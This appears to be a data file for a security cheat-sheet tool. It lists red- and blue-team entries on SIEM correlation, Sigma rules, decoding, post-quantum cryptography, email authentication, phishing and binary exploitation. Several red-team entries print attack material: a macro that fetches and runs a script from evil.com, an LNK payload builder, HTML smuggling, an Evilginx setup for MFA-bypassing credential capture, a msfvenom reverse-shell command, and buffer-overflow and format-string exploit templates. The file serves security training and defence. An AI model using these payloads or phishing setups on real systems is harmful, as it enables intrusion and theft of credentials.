      tags: ['correlation', 'timeline', 'incident-response', 'siem'], command: '# === Splunk: Correlate login + process + network ===\n# Step 1: Find suspicious login\nindex=main EventCode=4624 LogonType=10 | table _time, src_ip, user, ComputerName\n\n# Step 2: Process activity from that host after login\nindex=main EventCode=4688 ComputerName="TARGET" earliest=-5m latest=+1h\n| table _time, NewProcessName, CommandLine, ParentProcessName\n\n# Step 3: Network connections from that host\nindex=main sourcetype=proxy src_ip="TARGET_IP" earliest=-5m latest=+1h\n| table _time, dest_ip, dest_port, bytes_out\n\n# === Linux: Build timeline from multiple logs ===\n# Merge and sort by timestamp\npaste -d" " <(grep "2024-01" /var/log/auth.log) <(grep "2024-01" /var/log/syslog) | sort -k1,2\n\n# Find all activity from a specific IP\ngrep -rh "192.168.1.100" /var/log/*.log | sort\n\n# === ELK: Correlation search ===\n# Join by source IP: failed login → successful login → lateral movement\n(event.code: "4625" and source.ip: "SUSPECT_IP") or\n(event.code: "4624" and source.ip: "SUSPECT_IP") or\n(event.code: "4648" and user.name: "COMPROMISED_USER")',
      killchain: 'actions', attack: ['collection', 'lateral-movement', 'discovery'], pyramid: 'ttps', owasp: [] },

    { id: 'sigma-rules', title: 'Sigma Detection Rules', team: 'blue', category: 'siem',
      description: 'Write and convert Sigma rules — vendor-agnostic detection format for SIEM platforms.',
      tags: ['sigma', 'detection', 'siem', 'rules'], command: '# === Example Sigma Rule (YAML) ===\n# title: Suspicious PowerShell Download Cradle\n# status: experimental\n# logsource:\n#   category: process_creation\n#   product: windows\n# detection:\n#   selection:\n#     Image|endswith: \\powershell.exe\n#     CommandLine|contains:\n#       - IEX\n#       - Invoke-Expression\n#       - DownloadString\n#       - WebClient\n#   condition: selection\n# level: high\n# tags:\n#   - attack.execution\n#   - attack.t1059.001\n\n# Install sigmac (converter)\npip install sigma-cli\n\n# Convert to Splunk SPL\nsigma convert -t splunk -p sysmon rule.yml\n\n# Convert to ELK / Kibana\nsigma convert -t elasticsearch-lucene rule.yml\n\n# Convert to QRadar AQL\nsigma convert -t qradar rule.yml\n\n# Validate rule\nsigma check rule.yml\n\n# Bulk convert a ruleset\nsigma convert -t splunk -p sysmon sigma/rules/windows/process_creation/',
      killchain: 'actions', attack: ['execution', 'defense-evasion'], pyramid: 'ttps', owasp: [] },

    // ── Encoding & CyberChef ─────────────────────────────────
    { id: 'cyberchef-recipes', title: 'CyberChef Core Recipes', team: 'blue', category: 'encoding',
      description: 'Essential CyberChef recipes: decode Base64, XOR, extract URLs/IPs, deobfuscate, magic.',
      tags: ['cyberchef', 'decoding', 'analysis', 'encoding'], command: '# CyberChef URL: https://gchq.github.io/CyberChef/\n\n# === Common Recipes ===\n# Decode Base64\nFrom_Base64(\'A-Za-z0-9+/=\',true,false)\n\n# Decode multiple Base64 layers\nLoop([\'From_Base64\'],3)\n\n# XOR with key\nXOR({\'option\':\'UTF8\',\'string\':\'secret\'},\'Standard\',false)\n\n# XOR brute force (single byte)\nXOR_Brute_Force(1,100,\'Standard\',\'.*password.*\',true,false)\n\n# Extract URLs from text\nExtract_URLs(false)\n\n# Extract IPs\nExtract_IP_addresses(false,false,false)\n\n# Magic — auto-detect encoding\nMagic(3,false,false,\'\')\n\n# === Malware Analysis ===\n# Decode PowerShell -EncodedCommand\nFrom_Base64 → Decode_text(\'UTF-16LE\')\n\n# Defang URLs for sharing\nDefang_URL(true,true,true,true)\n\n# ROT13\nROT13(true,true,false,13)\n\n# Hex decode\nFrom_Hex(\'Auto\')',
      killchain: 'actions', attack: ['defense-evasion', 'execution'], pyramid: 'tools', owasp: [] },

    { id: 'encoding-cli', title: 'Encoding/Decoding — CLI', team: 'red', category: 'encoding',
      description: 'Command-line encoding/decoding: Base64, hex, URL, binary, ROT13 for payload work.',
      tags: ['base64', 'hex', 'encoding', 'decoding'],
      commands: {
        linux: '# Base64 encode/decode\necho -n "payload" | base64\necho "cGF5bG9hZA==" | base64 -d\n\n# Hex encode/decode\necho -n "payload" | xxd -p\necho "7061796c6f6164" | xxd -r -p\n\n# URL encode\npython3 -c "import urllib.parse; print(urllib.parse.quote(\'<script>alert(1)</script>\'))"\n\n# URL decode\npython3 -c "import urllib.parse; print(urllib.parse.unquote(\'%3Cscript%3Ealert(1)%3C%2Fscript%3E\'))"\n\n# ROT13\necho "secret" | tr \'a-zA-Z\' \'n-za-mN-ZA-M\'\n\n# Binary to ASCII\necho "01110000 01110111 01101110" | perl -lape \'$_=pack"B*",s/ //gr\'',
        windows: '# Base64 encode/decode (PowerShell)\n[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("payload"))\n[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("cGF5bG9hZA=="))\n\n# Hex encode/decode\n("payload" | Format-Hex).Bytes.ForEach({$_.ToString("x2")}) -join ""\n[byte[]]$hex = "7061796c6f6164" -split \'(..)\' | ?{$_} | %{[convert]::ToByte($_,16)}\n[Text.Encoding]::UTF8.GetString($hex)\n\n# URL encode\n[uri]::EscapeDataString("<script>alert(1)</script>")\n\n# certutil Base64 decode\ncertutil -decode encoded.txt decoded.bin'
      },
      killchain: 'weaponize', attack: ['defense-evasion'], pyramid: 'tools', owasp: ['A03'] },

    { id: 'hash-operations', title: 'Hashing & Integrity Checks', team: 'blue', category: 'encoding',
      description: 'Generate and verify file hashes (MD5, SHA1, SHA256) for integrity verification and IOC matching.',
      tags: ['hash', 'sha256', 'md5', 'integrity'],
      commands: {
        linux: '# SHA256 hash of file\nsha256sum m_alware.exe\n\n# MD5 (legacy, for IOC matching)\nmd5sum m_alware.exe\n\n# SHA1\nsha1sum m_alware.exe\n\n# Hash a string\necho -n "password123" | sha256sum\n\n# Verify hash against known value\necho "abc123def456... m_alware.exe" | sha256sum --check\n\n# Recursive hash all files in directory\nfind /evidence -type f -exec sha256sum {} + > hashes.txt\n\n# Compare two hash lists\ndiff <(sort hashes_before.txt) <(sort hashes_after.txt)',
        windows: '# SHA256 hash of file\nGet-FileHash m_alware.exe -Algorithm SHA256\n\n# MD5 (legacy, for IOC matching)\nGet-FileHash m_alware.exe -Algorithm MD5\n\n# Hash all files in directory\nGet-ChildItem -Recurse -File | Get-FileHash -Algorithm SHA256 | Export-Csv hashes.csv\n\n# certutil hash\ncertutil -hashfile m_alware.exe SHA256\n\n# Compare hashes\n(Get-FileHash file1.exe).Hash -eq (Get-FileHash file2.exe).Hash'
      },
      killchain: 'actions', attack: ['collection'], pyramid: 'hashes', owasp: [] },

    { id: 'xor-analysis', title: 'XOR Analysis & Decryption', team: 'blue', category: 'encoding',
      description: 'XOR key extraction, single-byte brute force, multi-byte XOR decryption for malware analysis.',
      tags: ['xor', 'crypto', 'malware', 'decryption'], command: '# Single-byte XOR brute force (Python)\npython3 -c "\nimport sys\ndata = open(sys.argv[1], \'rb\').read()\nfor key in range(256):\n    decoded = bytes([b ^ key for b in data[:100]])\n    if b\'http\' in decoded or b\'MZ\' in decoded or b\'This program\' in decoded:\n        print(f\'Key: 0x{key:02x} — {decoded[:50]}\')\n" encrypted.bin\n\n# Multi-byte XOR (known key)\npython3 -c "\nkey = b\'secret\'\ndata = open(\'encrypted.bin\', \'rb\').read()\ndecrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])\nopen(\'decrypted.bin\', \'wb\').write(decrypted)\n"\n\n# XOR two files (find the key)\npython3 -c "\na = open(\'plain.bin\', \'rb\').read()\nb = open(\'cipher.bin\', \'rb\').read()\nkey = bytes([a[i] ^ b[i] for i in range(min(len(a), len(b)))])\nprint(\'Key:\', key[:32])\n"\n\n# CyberChef: XOR Brute Force recipe\n# XOR_Brute_Force(1,100,\'Standard\',\'.*password.*\',true,false)',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },

    { id: 'obfuscation-decode', title: 'Deobfuscation Techniques', team: 'blue', category: 'encoding',
      description: 'Deobfuscate encoded payloads: PowerShell, JavaScript, VBA macro, PHP webshells.',
      tags: ['deobfuscation', 'analysis', 'malware', 'encoding'], command: '# === PowerShell Deobfuscation ===\n# Decode -EncodedCommand\necho "JABjAGwAaQBlAG4A..." | base64 -d | iconv -f UTF-16LE -t UTF-8\n\n# Decode string concatenation: $a="I"+"EX"; &$a\n# Just replace + with nothing and read\n\n# Decode char arrays: [char[]](73,69,88) -join ""\npython3 -c "print(\'\'.join(chr(c) for c in [73,69,88]))"\n\n# === JavaScript Deobfuscation ===\n# Replace e_val() with console.warn() to reveal payload\n# Use: https://deobfuscate.io or https://lelinhtinh.github.io/de4js/\n\n# Unescape unicode\npython3 -c "print(\'\\\\u0048\\\\u0065\\\\u006c\'.encode().decode(\'unicode_escape\'))"\n\n# === VBA Macro ===\n# Extract from Office doc\nolevba m_alicious.docm\n\n# Decode Chr() calls\npython3 -c "print(\'\'.join(chr(c) for c in [87,83,99,114,105,112,116]))"\n\n# === PHP Webshell ===\n# Decode base64+gzinflate pattern\nphp -r "echo gzinflate(base64_decode(\'...encoded...\')); "\n\n# Decode str_rot13\nphp -r "echo str_rot13(\'...rotated...\');"',
      killchain: 'actions', attack: ['defense-evasion', 'execution'], pyramid: 'ttps', owasp: [] },

    // ── Post-Quantum Cryptography (PQC) ─────────────────────────
    { id: 'pqc-inventory', title: 'Crypto Inventory & Audit', team: 'blue', category: 'pqc',
      description: 'Audit system for quantum-vulnerable algorithms. Inventory RSA, ECC, and symmetric key lengths.',
      tags: ['pqc', 'audit', 'inventory', 'nist'],
      commands: {
        linux: '# Find RSA/ECC keys in directory\ngrep -rE "BEGIN (RSA|EC) PRIVATE KEY" .\n\n# Check certificate for classical algorithms\nopenssl x509 -in cert.pem -text -noout | grep -E "Public Key Algorithm|Signature Algorithm"\n\n# Find weak symmetric encryption (AES-128)\ngrep -r "AES-128" src/',
        windows: '# Find certificate algorithms\nGet-ChildItem Cert:\\LocalMachine\\My | Select-Object Subject, FriendlyName, SignatureAlgorithm, PublicKey'
      },
      killchain: 'defense', attack: ['discovery'], pyramid: 'ttps', owasp: [] },

    { id: 'pqc-tls-check', title: 'TLS 1.3 Hybrid Key Exchange Scan', team: 'blue', category: 'pqc',
      description: 'Check if a server supports PQC hybrid key exchange (e.g., X25519 + ML-KEM).',
      tags: ['pqc', 'tls', 'kyber', 'ml-kem'],
      command: '# Use OpenSSL 3.2+ to check for ML-KEM support\nopenssl s_client -connect TARGET:443 -tls1_3 -groups x25519_kyber768\n\n# Using OQS-OpenSSL (Open Quantum Safe)\n./openssl s_client -connect TARGET:443 -groups p256_kyber768',
      killchain: 'defense', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },

    { id: 'pqc-gen-keys', title: 'Generate PQC Keys (ML-KEM / ML-DSA)', team: 'blue', category: 'pqc',
      description: 'Generate NIST-standardized quantum-safe keys using OpenSSL 3.3+ or OQS-provider.',
      tags: ['pqc', 'ml-kem', 'ml-dsa', 'keygen'],
      command: '# Generate ML-KEM-768 key (formerly Kyber)\nopenssl genpkey -algorithm ML-KEM-768 -out pqc_priv.pem\n\n# Generate ML-DSA-65 (formerly Dilithium)\nopenssl genpkey -algorithm ML-DSA-65 -out sig_priv.pem\n\n# Create a CSR with PQC signature\nopenssl req -new -key sig_priv.pem -out pqc.csr -subj "/CN=PQC-Test"',
      killchain: 'weaponization', attack: ['resource-development'], pyramid: 'tools', owasp: [] },

    { id: 'pqc-risk-assessment', title: 'HNDL Risk Assessment', team: 'blue', category: 'pqc',
      description: 'Assess "Harvest Now, Decrypt Later" risk for sensitive data assets.',
      tags: ['pqc', 'hndl', 'risk-management'],
      command: '# 1. Identify high-value data with >10 year lifespan\n# 2. Audit current encryption (Classical vs Hybrid)\n# 3. Check for AES-256 (Grover-resistant)\n# 4. Map data flow to untrusted networks',
      killchain: 'defense', attack: ['discovery'], pyramid: 'ttps', owasp: [] },

    // ── Phishing & Email Security ────────────────────────────
    { id: 'email-header-analysis', title: 'Email Header Analysis', team: 'blue', category: 'phishing',
      description: 'Analyze email headers: trace routing, verify SPF/DKIM/DMARC, identify spoofing indicators.',
      tags: ['email', 'headers', 'spf', 'dkim', 'dmarc'], command: '# === Key Headers to Check ===\n# Received: (bottom-up = delivery path)\n# Return-Path: (envelope sender — spoofable)\n# From: (display sender — easily spoofed)\n# Reply-To: (if different from From: — suspicious)\n# X-Originating-IP: (sender actual IP)\n# Message-ID: (domain should match sender)\n\n# === SPF Check ===\n# Look for: Received-SPF: pass/fail\n# Or Authentication-Results: spf=pass\nnslookup -type=txt example.com   # View SPF record\ndig txt example.com +short        # Linux alternative\n\n# === DKIM Check ===\n# Look for: DKIM-Signature: header\n# Authentication-Results: dkim=pass\nnslookup -type=txt selector._domainkey.example.com\n\n# === DMARC Check ===\nnslookup -type=txt _dmarc.example.com\n# p=none (monitor) | p=quarantine | p=reject\n\n# === Online Analyzers ===\n# https://mxtoolbox.com/EmailHeaders.aspx\n# https://toolbox.googleapps.com/apps/messageheader/\n\n# === Red Flags ===\n# - SPF fail + From: spoofed domain\n# - Reply-To different from From:\n# - Received: chain shows unexpected hops\n# - X-Mailer: unusual mail client\n# - Short URLs or punycode domains in body',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'artifacts', owasp: [] },

    { id: 'gophish-campaign', title: 'GoPhish Campaign Setup', team: 'red', category: 'phishing',
      description: 'Set up a GoPhish phishing campaign: SMTP, landing page, email template, user groups.',
      tags: ['gophish', 'phishing', 'social-engineering', 'campaign'], command: '# Install GoPhish\nwget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip\nunzip gophish-*.zip && cd gophish\nchmod +x gophish && ./gophish\n# Default: https://localhost:3333 (admin / gophish)\n\n# === Configuration Steps ===\n# 1. Sending Profile (SMTP)\n# - Name: "Corp Mail"\n# - Host: smtp.example.com:587\n# - Username: phish@example.com\n# - From: "IT Support <it-support@example.com>"\n\n# 2. Landing Page\n# - Import from URL: https://target-company.com/login\n# - Enable "Capture Credentials"\n# - Enable "Capture Passwords"\n# - Redirect to: https://target-company.com/login\n\n# 3. Email Template\n# - Subject: "Action Required: Password Expiry"\n# - Use {{.FirstName}} for personalization\n# - Include {{.URL}} as the phishing link\n# - Add {{.Tracker}} for open tracking\n\n# 4. Users & Groups\n# - Import CSV: First,Last,Email,Position\n# - Or enter manually\n\n# 5. Campaign\n# - Select all above\n# - Set send date/time\n# - Launch\n\n# === API ===\ncurl -H "Authorization: Bearer API_KEY" https://localhost:3333/api/campaigns/',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: [] },

    { id: 'spf-dkim-dmarc', title: 'SPF/DKIM/DMARC Setup & Audit', team: 'blue', category: 'phishing',
      description: 'Configure and audit email authentication: SPF, DKIM, DMARC records for anti-spoofing.',
      tags: ['spf', 'dkim', 'dmarc', 'email-security', 'dns'], command: '# === SPF Record ===\n# DNS TXT record at domain root\n# v=spf1 include:_spf.google.com include:servers.mcsv.net ip4:203.0.113.0/24 -all\n#   ~all = softfail (quarantine)    -all = hardfail (reject)\n\n# Check SPF\nnslookup -type=txt example.com\ndig txt example.com +short\n\n# === DKIM Setup ===\n# 1. Generate keypair (2048-bit RSA)\nopenssl genrsa -out dkim-private.pem 2048\nopenssl rsa -in dkim-private.pem -pubout -outform der 2>/dev/null | base64 -w0\n\n# 2. Publish public key as DNS TXT:\n# selector1._domainkey.example.com TXT "v=DKIM1; k=rsa; p=MIIBIjANBg..."\n\n# Check DKIM\nnslookup -type=txt selector1._domainkey.example.com\n\n# === DMARC Record ===\n# DNS TXT at _dmarc.example.com\n# v=DMARC1; p=reject; rua=mailto:dmarc@example.com; ruf=mailto:forensics@example.com; pct=100\n#   p=none (monitor) → p=quarantine → p=reject (gradual rollout)\n\n# Check DMARC\nnslookup -type=txt _dmarc.example.com\n\n# === Audit All Three ===\n# https://mxtoolbox.com/SuperTool.aspx\n# Or: dig txt example.com && dig txt _dmarc.example.com && dig txt selector._domainkey.example.com',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'domains', owasp: [] },

    { id: 'phishing-indicators', title: 'Phishing Indicator Checklist', team: 'blue', category: 'phishing',
      description: 'Analyze suspicious emails: URL analysis, attachment checks, sender verification, IOC extraction.',
      tags: ['phishing', 'analysis', 'indicators', 'triage'], command: '# === URL Analysis ===\n# Defang URL first: hxxps://evil[.]com/login\n# Check URL reputation:\n# - https://www.virustotal.com/gui/url/\n# - https://urlscan.io/\n# - https://www.hybrid-analysis.com/\n\n# Expand shortened URLs\ncurl -sI "https://bit.ly/XXXX" | grep -i location\n\n# Check domain age (new = suspicious)\nwhois suspicious-domain.com | grep "Creation Date"\n\n# === Attachment Analysis ===\n# Get hash without executing\nsha256sum attachment.docx\n# Check on VirusTotal\n# Extract macros\nolevba attachment.docm\n\n# Check for embedded files\nbinwalk attachment.pdf\n\n# === Sender Verification ===\n# Verify envelope sender matches display\n# Check Received: headers (should be consistent)\n# Verify SPF/DKIM/DMARC alignment\n\n# === IOC Extraction ===\n# Extract all URLs from email body\ngrep -oP \'https?://[^\\s<>"]+\' email.eml\n\n# Extract all IPs\ngrep -oP \'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\' email.eml\n\n# Extract email addresses\ngrep -oP \'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}\' email.eml',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'artifacts', owasp: [] },

    { id: 'phishing-payloads', title: 'Phishing Payload Techniques', team: 'red', category: 'phishing',
      description: 'Craft phishing payloads: HTML smuggling, macro documents, LNK files, QR phishing.',
      tags: ['phishing', 'payload', 'social-engineering', 'delivery'], command: '# === HTML Smuggling ===\n# Embed payload in HTML, auto-download via JS blob\n# <script>\n# var data = "TVqQAAMA..."  // Base64 encoded PE\n# var blob = new Blob([Uint8Array.from(atob(data), c=>c.charCodeAt(0))])\n# var a = document.createElement("a")\n# a.href = URL.createObjectURL(blob)\n# a.download = "update.exe"\n# a.click()\n# </script>\n\n# === Macro-enabled Document ===\n# VBA Auto_Open payload (Word)\n# Sub Auto_Open()\n#   Shell("powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'https://evil.com/s.ps1\')")\n# End Sub\n\n# === LNK Shortcut Payload ===\n# Create m_alicious .lnk\n$wsh = New-Object -ComObject WScript.Shell\n$lnk = $wsh.CreateShortcut("$env:TEMP\\important.lnk")\n$lnk.TargetPath = "cmd.exe"\n$lnk.Arguments = "/c powershell -ep bypass -f \\\\attacker\\share\\payload.ps1"\n$lnk.IconLocation = "shell32.dll,1"  # PDF icon\n$lnk.Save()\n\n# === QR Code Phishing (Quishing) ===\npip install qrcode\npython3 -c "import qrcode; qrcode.make(\'https://evil-login.com/auth\').save(\'qr.png\')"',
      killchain: 'delivery', attack: ['initial-access', 'execution'], pyramid: 'ttps', owasp: [] },

    { id: 'phishing-infra', title: 'Phishing Infrastructure (Red Team)', team: 'red', category: 'phishing',
      description: 'Set up phishing infrastructure: domain categorization, certificates, evilginx, redirect.',
      tags: ['phishing', 'infrastructure', 'evilginx', 'redirect'], command: '# === Domain Setup ===\n# 1. Register lookalike domain (typosquat, homoglyph)\n#    examp1e.com, examplе.com (Cyrillic е)\n# 2. Age the domain (2+ weeks before campaign)\n# 3. Set up SPF/DKIM/DMARC for deliverability\n# 4. Categorize via web browsing (avoid "phishing" category)\n\n# === Let\'s Encrypt Certificate ===\ncertbot certonly --standalone -d evil-login.example.com\n\n# === Evilginx3 — MitM Phishing Proxy ===\n# Bypass MFA by proxying real login\nsudo evilginx3\nconfig domain evil.com\nconfig ipv4 <VPS_IP>\nphishlets hostname o365 login.evil.com\nphishlets enable o365\nlures create o365\nlures get-url 0\n# Victim visits lure URL → real O365 login → session token captured\n\n# === Redirect Rules ===\n# Apache .htaccess — redirect scanners, block VPN/datacenter IPs\n# RewriteEngine On\n# RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|scanner) [NC]\n# RewriteRule .* https://legitimate-site.com [R=302,L]\n\n# === GoPhish + Evilginx Integration ===\n# GoPhish sends email → link to Evilginx lure → captures session\n# Set GoPhish URL to Evilginx lure URL',
      killchain: 'delivery', attack: ['initial-access', 'credential-access'], pyramid: 'tools', owasp: [] },

    // ── Binary Exploitation ──────────────────────────────────
    { id: 'bof-basics', title: 'Buffer Overflow — Basics', team: 'red', category: 'binexp',
      description: 'Stack buffer overflow methodology: fuzzing, offset, EIP control, shellcode, exploit.',
      tags: ['buffer-overflow', 'exploitation', 'gdb', 'binary'], command: '# === Methodology ===\n# 1. Fuzz to find crash point\npython3 -c "print(\'A\' * 5000)" | nc target 9999\n\n# 2. Find exact offset (Metasploit pattern)\nmsf-pattern_create -l 5000\n# Send pattern, note EIP value\nmsf-pattern_offset -l 5000 -q <EIP_VALUE>\n\n# 3. Confirm offset control\npython3 -c "print(\'A\' * OFFSET + \'BBBB\' + \'C\' * 100)" | nc target 9999\n# EIP should be 42424242\n\n# 4. Find bad characters (send all 0x00-0xFF, check for truncation)\n\n# 5. Find JMP ESP (or equivalent)\nmsf-nasm_shell\n# nasm > jmp esp → FFE4\n!mona jmp -r esp -cpb "\\x00"\n\n# 6. Generate shellcode\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -b "\\x00" -f python\n\n# 7. Final exploit structure:\n# [JUNK * offset] + [JMP ESP addr] + [NOP sled] + [shellcode]\npython3 -c "\nimport struct\noffset = 2003\njmp_esp = struct.pack(\'<I\', 0x625011AF)\nnops = b\'\\x90\' * 16\nshellcode = b\'...\'  # msfvenom output\npayload = b\'A\' * offset + jmp_esp + nops + shellcode\nprint(payload)\n"',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'ttps', owasp: ['A03'] },

    { id: 'pwntools-template', title: 'Pwntools Exploit Template', team: 'red', category: 'binexp',
      description: 'Python pwntools template for CTF binary exploitation: local/remote, ROP, shellcode.',
      tags: ['pwntools', 'exploitation', 'rop', 'binary'], command: '#!/usr/bin/env python3\nfrom pwn import *\n\n# Context\ncontext.binary = elf = ELF(\'./vuln\')\ncontext.log_level = \'info\'\n\n# Libc (if needed)\n# libc = ELF(\'./libc.so.6\')\n\n# Connect\nif args.REMOTE:\n    p = remote(\'target.ctf\', 1337)\nelse:\n    p = process(elf.path)\n\n# Find offset\n# cyclic(200)        # Generate pattern\n# cyclic_find(0x...)  # Find offset from crash\n\noffset = 40  # adjust\n\n# ROP chain\nrop = ROP(elf)\nrop.call(elf.symbols[\'win\'])  # Simple ret2win\n# OR: rop.call(elf.plt[\'system\'], [next(elf.search(b\'/bin/sh\'))])\n\n# Build payload\npayload = flat({\n    offset: rop.chain()\n})\n\n# Send\np.sendlineafter(b\'> \', payload)\np.interactive()',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'ttps', owasp: ['A03'] },

    { id: 'gdb-peda', title: 'GDB + PEDA/GEF Debugging', team: 'red', category: 'binexp',
      description: 'GDB with PEDA/GEF for binary analysis: breakpoints, stack inspection, pattern, checksec.',
      tags: ['gdb', 'peda', 'gef', 'debugging', 'binary'], command: '# Start GDB with PEDA\ngdb -q ./vulnerable_binary\n\n# === PEDA Commands ===\npeda> checksec           # Check NX, ASLR, PIE, canary\npeda> pattern create 200 # Generate cyclic pattern\npeda> run                # Run with pattern as input\npeda> pattern offset $eip # Find offset from crash\n\npeda> vmmap              # Show memory mappings\npeda> find "/bin/sh"     # Search memory for string\npeda> dumpargs           # Show function arguments\npeda> context            # Show registers + stack + code\n\n# === GEF Commands ===\ngef> checksec\ngef> pattern create 200\ngef> pattern search $rsp  # 64-bit\ngef> heap chunks          # Heap analysis\ngef> got                  # GOT table\ngef> canary               # Show stack canary value\n\n# === Common GDB ===\nb *main+42              # Breakpoint at offset\nb *0x08048456           # Breakpoint at address\nr < input.txt           # Run with file input\nx/20wx $esp             # Examine 20 words at ESP\nx/s 0x08048500          # Examine as string\ninfo functions           # List functions\ndisas main              # Disassemble main\nset {int}0x0804a000 = 0 # Write memory\nnext / step / continue   # Flow control',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'tools', owasp: [] },

    { id: 'checksec-protections', title: 'Binary Protections & Bypasses', team: 'red', category: 'binexp',
      description: 'Identify and bypass binary protections: NX, ASLR, PIE, canaries, RELRO.',
      tags: ['checksec', 'aslr', 'nx', 'canary', 'rop'], command: '# === Check protections ===\nchecksec --file=./binary\n# Or in GDB: checksec\n\n# === Protections Reference ===\n# NX (No Execute)     — Stack not executable → use ROP\n# ASLR               — Address randomization → leak addresses\n# PIE                — Position Independent → leak base address\n# Stack Canary       — Guard value → leak or brute-force canary\n# RELRO (Full)       — GOT read-only → can\'t overwrite GOT\n# RELRO (Partial)    — GOT writable → GOT overwrite possible\n\n# === NX Bypass: ROP (Return-Oriented Programming) ===\n# Find gadgets\nROPgadget --binary ./binary | grep "pop rdi"\nropper --file ./binary --search "pop rdi"\n\n# Ret2libc (64-bit)\n# payload = padding + pop_rdi + bin_sh_addr + ret + system_addr\n\n# === ASLR Bypass ===\n# Leak libc address via format string or GOT read\n# Calculate offsets: libc_base = leaked_addr - known_offset\n\n# === Stack Canary Bypass ===\n# Format string: leak canary from stack\n# Brute force: fork server → byte-by-byte (256 * 4 attempts)\n\n# === PIE Bypass ===\n# Leak any code address → subtract known offset → ELF base\n\n# Compile vulnerable binary (for practice)\ngcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie -m32',
      killchain: 'exploitation', attack: ['execution', 'defense-evasion'], pyramid: 'ttps', owasp: ['A03'] },

    { id: 'format-string', title: 'Format String Exploitation', team: 'red', category: 'binexp',
      description: 'Format string vulnerability exploitation: stack leak, arbitrary read/write, GOT overwrite.',
      tags: ['format-string', 'exploitation', 'binary', 'memory'], command: '# === Identify Format String Vuln ===\n# printf(user_input) instead of printf("%s", user_input)\n\n# Test with format specifiers\necho "AAAA%08x.%08x.%08x.%08x" | ./vuln\n# If you see hex values → format string vuln!\n\n# === Stack Leak ===\n# Read values from stack (find your input)\npython3 -c "print(\'AAAA\' + \'.%08x\' * 20)" | ./vuln\n# Find 41414141 → that\'s your buffer position\n\n# === Arbitrary Read (%s) ===\n# Read string at address 0x08048500\npython3 -c "import struct; print(struct.pack(\'<I\', 0x08048500) + b\'%7\\$s\')" | ./vuln\n\n# === Arbitrary Write (%n) ===\n# %n writes number of chars printed so far to address\n# Write value to GOT entry\npython3 -c "\nfrom pwn import *\ntarget_addr = 0x0804a010  # GOT entry\nwrite_val = 0x08048456    # Target function\npayload = fmtstr_payload(7, {target_addr: write_val})\nprint(payload)\n" | ./vuln\n\n# Pwntools auto format string\nfrom pwn import *\np = process(\'./vuln\')\npayload = fmtstr_payload(offset, {got_addr: target_addr})\np.sendline(payload)',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'ttps', owasp: ['A03'] },

    // ── Reverse Engineering ──────────────────────────────────
    { id: 'ghidra-workflow', title: 'Ghidra — RE Workflow', team: 'red', category: 'reveng',
      description: 'Ghidra reverse engineering workflow: import binary, auto-analyze, navigate functions, decompile.',
      tags: ['ghidra', 'reverse-engineering', 'decompiler', 'binary'], command: '# === Ghidra Setup ===\n# Download: https://github.com/NationalSecurityAgency/ghidra/releases\n# Requires: Java JDK 17+\n# Launch: ./ghidraRun (Linux/Mac) or ghidraRun.bat (Windows)\n\n# === Workflow ===\n# 1. File → New Project → Non-Shared Project\n# 2. File → Import File → select binary\n# 3. Auto-Analysis: Yes (accept defaults)\n# 4. Wait for analysis to complete\n\n# === Key Windows ===\n# Symbol Tree — navigate functions, imports, exports\n# Listing — disassembly view\n# Decompiler — C pseudocode (primary analysis view)\n# Defined Strings — find hardcoded strings\n# Cross References (Xrefs) — where is this called/used?\n\n# === Common Tasks ===\n# Find main: Symbol Tree → Functions → main\n# Rename function: Right-click → Rename Function\n# Add comment: Right-click → Set Pre/Post Comment\n# Change type: Right-click → Retype Variable\n# Find strings: Search → For Strings\n# Xrefs to: Right-click → References → Show References To\n# Patch bytes: Right-click → Patch Instruction\n\n# === Scripting (Jython/Java) ===\n# Window → Script Manager\n# Useful scripts: FindStrings, SearchMemory, FunctionCallGraph\n\n# === Headless mode (batch analysis) ===\n./analyzeHeadless /tmp/project ProjectName -import binary.exe -postScript MyScript.java',
      killchain: 'recon', attack: ['discovery'], pyramid: 'ttps', owasp: [] },

    { id: 'radare2-basics', title: 'Radare2 — CLI Reverse Engineering', team: 'red', category: 'reveng',
      description: 'Radare2 command-line RE framework: analysis, disassembly, debugging, patching.',
      tags: ['radare2', 'r2', 'reverse-engineering', 'disassembly'], command: '# Open binary for analysis\nr2 -A ./binary          # -A = auto-analyze\nr2 -d ./binary          # -d = debug mode\n\n# === Navigation ===\nafl                     # List all functions\nafl~main                # Filter functions by name\ns main                  # Seek to function\npdf                     # Print disassembly of current function\npdf @ sym.main          # Disassembly of specific function\n\n# === Analysis ===\naaa                     # Analyze all (thorough)\naa                      # Analyze (quick)\naxt @ sym.imp.strcmp     # Xrefs to strcmp (find comparisons)\nizz                     # List all strings in binary\nizz~password             # Filter strings\nii                      # Imports\nie                      # Exports\n\n# === Visual Mode ===\nV                       # Enter visual mode\nVV                      # Enter graph mode (function flow)\np/P                     # Cycle through visual panels\n\n# === Debugging ===\ndb main                 # Set breakpoint\ndc                      # Continue execution\nds                      # Step into\ndso                     # Step over\ndr                      # Show registers\npx 64 @ rsp             # Hexdump 64 bytes at RSP\n\n# === Patching ===\nwa nop @ 0x08048456     # Write NOP at address\nwx 9090 @ 0x08048456    # Write hex bytes\n\n# === Rabin2 (file info) ===\nrabin2 -I ./binary      # File info (arch, bits, protections)\nrabin2 -z ./binary      # Strings\nrabin2 -i ./binary      # Imports',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: [] },

